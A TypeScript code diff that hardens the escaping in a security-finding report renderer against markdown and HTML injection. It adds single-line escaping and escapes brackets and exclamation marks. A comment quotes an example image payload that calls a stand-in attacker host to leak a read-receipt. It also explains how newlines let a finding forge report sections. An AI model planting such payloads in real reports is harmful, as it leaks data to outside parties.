@@ -88,7 +88,7 @@ export function renderMarkdown(r: ReportInput): string {
 			const comp = c.resolution?.computed;
 			const loc = c.locations[0];
 			out.push(
-				`| ${c.id} | ${comp ? formatSeverity(comp) : "?"} | ${comp?.confidence.toFixed(1) ?? "?"} | ${esc(c.title)} | \`${loc ? `${esc(loc.path)}:${loc.start_line}` : "?"}\` |`,
+				`| ${c.id} | ${comp ? formatSeverity(comp) : "?"} | ${comp?.confidence.toFixed(1) ?? "?"} | ${escInline(c.title)} | \`${loc ? `${esc(loc.path)}:${loc.start_line}` : "?"}\` |`,
 			);
 		}
 		out.push("");
@@ -105,7 +105,7 @@ export function renderMarkdown(r: ReportInput): string {
 		);
 		for (const c of followUp) {
 			out.push(
-				`- **${c.id}** ${esc(c.title)} — \`${firstLoc(c)}\`${
+				`- **${c.id}** ${escInline(c.title)} — \`${firstLoc(c)}\`${
 					c.resolution?.rationale ? `\n  ${esc(c.resolution.rationale)}` : ""
 				}`,
 			);
@@ -127,7 +127,7 @@ export function renderMarkdown(r: ReportInput): string {
 		}
 		for (const c of suppressed) {
 			const why = c.resolution?.computed?.rationale?.[0] ?? c.resolution?.rationale ?? "";
-			out.push(`- **${c.id}** ${esc(c.title)} — ${esc(why)}`);
+			out.push(`- **${c.id}** ${escInline(c.title)} — ${escInline(why)}`);
 		}
 		out.push("");
 	}
@@ -135,7 +135,7 @@ export function renderMarkdown(r: ReportInput): string {
 	if (notApplicable.length > 0) {
 		out.push("## Not applicable", "");
 		for (const c of notApplicable) {
-			out.push(`- **${c.id}** ${esc(c.title)} — ${esc(c.resolution?.rationale ?? "")}`);
+			out.push(`- **${c.id}** ${escInline(c.title)} — ${escInline(c.resolution?.rationale ?? "")}`);
 		}
 		out.push("");
 	}
@@ -144,7 +144,7 @@ export function renderMarkdown(r: ReportInput): string {
 		out.push("## Merged as duplicates", "");
 		for (const c of r.candidates.filter((x) => x.merged_into)) {
 			out.push(
-				`- **${c.id}** ${esc(c.title)} → merged into **${esc(c.merged_into ?? "?")}**: ${esc(c.resolution?.rationale ?? "")}`,
+				`- **${c.id}** ${escInline(c.title)} → merged into **${escInline(c.merged_into ?? "?")}**: ${escInline(c.resolution?.rationale ?? "")}`,
 			);
 		}
 		out.push("");
@@ -159,7 +159,7 @@ export function renderMarkdown(r: ReportInput): string {
 			"down. These are they.",
 			"",
 		);
-		for (const l of deadEnds) out.push(`- ${esc(l.text)}`);
+		for (const l of deadEnds) out.push(`- ${escInline(l.text)}`);
 		out.push("");
 	}
 
@@ -191,7 +191,7 @@ function renderFinding(c: Candidate): string[] {
 	const inputs = c.resolution?.inputs;
 	const out: string[] = [];
 
-	out.push(`### ${c.id} — ${esc(c.title)}`, "");
+	out.push(`### ${c.id} — ${escInline(c.title)}`, "");
 	out.push(
 		`**${comp ? formatSeverity(comp) : "unrated"}**` +
 			(comp ? ` · confidence ${comp.confidence.toFixed(1)}` : "") +
@@ -204,7 +204,7 @@ function renderFinding(c: Candidate): string[] {
 
 	out.push("**Locations**", "");
 	for (const l of c.locations) {
-		out.push(`- \`${esc(l.path)}:${l.start_line}-${l.end_line}\`${l.symbol ? ` — \`${esc(l.symbol)}\`` : ""}`);
+		out.push(`- \`${escInline(l.path)}:${l.start_line}-${l.end_line}\`${l.symbol ? ` — \`${escInline(l.symbol)}\`` : ""}`);
 	}
 	out.push("");
 
@@ -216,16 +216,20 @@ function renderFinding(c: Candidate): string[] {
 	}
 
 	if (inputs) {
+		// Every input, including the two that promote a finding to critical.
+		// Printing the conclusion while hiding what caused it is the one thing a
+		// report whose pitch is "a severity you can defend" cannot do.
 		out.push("**Severity inputs**", "");
 		out.push(
 			`\`impact=${inputs.impact}\` \`vector=${inputs.vector}\` \`auth_required=${inputs.auth_required}\` ` +
 				`\`network_reachable=${inputs.network_reachable}\` \`cross_tenant=${inputs.cross_tenant}\` ` +
-				`\`method=${inputs.method}\``,
+				`\`traced_path_no_control=${inputs.traced_path_no_control}\` ` +
+				`\`code_execution_proven=${inputs.code_execution_proven}\` \`method=${inputs.method}\``,
 			"",
 		);
 	}
 	if (comp?.rationale.length) {
-		for (const line of comp.rationale) out.push(`- ${esc(line)}`);
+		for (const line of comp.rationale) out.push(`- ${escInline(line)}`);
 		out.push("");
 	}
 	return out;
@@ -238,14 +242,32 @@ function firstLoc(c: Candidate): string {
 
 /**
  * Neutralize markdown/HTML that arrived as finding prose. Control characters
- * were already stripped at the write boundary; this stops a title from opening
- * a tag or breaking out of a table cell.
+ * and secret-shaped strings were already handled at the write boundary; this
+ * stops a title from opening a tag, breaking out of a table cell, or turning
+ * into an image that fires a request when the report is opened.
+ *
+ * `!` and `[` matter more than they look: `![x](https://attacker/?leak)` in a
+ * finding title renders as an image in every markdown viewer, which is a
+ * read-receipt on a security report.
  */
 function esc(s: string): string {
 	return String(s)
 		.replaceAll("<", "&lt;")
 		.replaceAll(">", "&gt;")
-		.replaceAll("|", "\\|");
+		.replaceAll("|", "\\|")
+		.replaceAll("[", "\\[")
+		.replaceAll("]", "\\]")
+		.replaceAll("!", "\\!");
+}
+
+/**
+ * For anywhere the text must stay on one line — table cells, headings, list
+ * items. A newline in a title otherwise terminates the row and the remainder
+ * is emitted as document-level markdown, which lets a finding forge sections
+ * and severities.
+ */
+function escInline(s: string): string {
+	return esc(String(s).replace(/[\r\n]+/g, " ")).trim();
 }
 
 /** Evidence is quoted, never fenced — a fence in the payload would close ours. */
